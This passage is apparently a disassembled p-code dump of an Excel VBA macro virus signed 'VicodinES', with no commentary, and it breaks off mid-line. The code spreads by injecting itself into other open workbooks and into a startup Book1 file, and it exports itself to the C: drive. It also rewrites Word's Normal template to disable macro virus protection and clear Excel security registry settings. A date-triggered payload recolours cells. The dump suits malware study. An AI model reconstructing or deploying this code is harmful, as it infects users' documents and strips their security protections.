' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet6 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
